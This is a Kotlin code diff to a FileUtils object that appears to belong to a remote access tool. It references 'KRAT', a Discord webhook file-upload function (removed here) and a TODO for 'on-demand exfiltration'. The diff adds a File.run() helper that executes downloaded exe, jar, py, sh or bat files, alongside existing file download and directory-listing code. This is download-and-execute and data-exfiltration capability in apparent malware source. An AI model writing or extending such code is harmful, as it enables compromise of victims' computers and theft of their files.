@@ -18,9 +18,9 @@ object FileUtils {
      * @param destination The directory path where the file should be saved.
      * @throws Exception if there's an error during the download process.
      */
-    fun download(url: String, destination: File) {
+    fun download(link: String, destination: File) {
         try {
-            val url = URI(url).toURL()
+            val url = URI(link).toURL()
             val connection = url.openConnection()
             connection.connect()
 
@@ -65,6 +65,53 @@ object FileUtils {
     }
 
     /**
+     * Runs the given File
+     * Supports: `exe`, `jar`, `py`, `sh`, `bat`
+     * @throws UnsupportedOperationException if OS can't run this extension
+     */
+    fun File.run() {
+        if (!exists()) {
+            throw IllegalArgumentException("File does not exist: $path")
+        }
+
+        try {
+            val isWindows = System.getProperty("os.name").startsWith("Windows")
+            val process = when (extension) {
+                "exe" -> {
+                    if (isWindows)
+                        ProcessBuilder(absolutePath)
+                    else
+                        throw UnsupportedOperationException("Unsupported file type: $extension only for Windows")
+
+                }
+                "jar" -> ProcessBuilder("java", "-jar", absolutePath)
+                "py" -> ProcessBuilder("python", absolutePath)
+                "sh" -> {
+                    if (!isWindows)
+                        ProcessBuilder("bash", absolutePath)
+                    else
+                        throw UnsupportedOperationException("Unsupported file type: $extension only for non-Windows")
+                }
+                "bat" -> {
+                    if (System.getProperty("os.name").startsWith("Windows"))
+                        ProcessBuilder(absolutePath)
+                    else
+                        throw UnsupportedOperationException("Unsupported file type: $extension only for Windows")
+                }
+                else -> throw UnsupportedOperationException("Unsupported file type: $extension")
+            }
+
+            process.inheritIO().start().waitFor()
+            println("File executed successfully: $path")
+        } catch (e: Exception) {
+            println("Error running file: ${e.message}")
+            throw e
+        }
+    }
+
+    // TODO: send file a the server (on-demand exfiltration)
+
+    /**
      * Creates a file tree string from the specified path.
      *
      * @param path The path to the directory to create the tree from.
@@ -93,27 +140,4 @@ object FileUtils {
             throw e
         }
     }
-
-
-    /**
-     * Sends the specified file as an attachment through the Discord webhook.
-     *
-     * @param file The file to be sent as an attachment.
-     */
-    fun send(file: File) {
-        Discord.webhook().apply {
-            attachments.add(file)
-            execute()
-        }
-    }
-}
-
-// Example usage
-fun main() {
-    // Download example
-//    FileUtils.download("https://github.com/xia-mc/Raven-XD/releases/download/v2.7.0/raven-XD.jar", KRAT.cacheDir)
-
-//     Run example
-//    FileUtils.run("C:\\Downloads\\file.exe")
-    println(FileUtils.fileTree("C:\\Users\\drsna\\IdeaProjects"))
 }
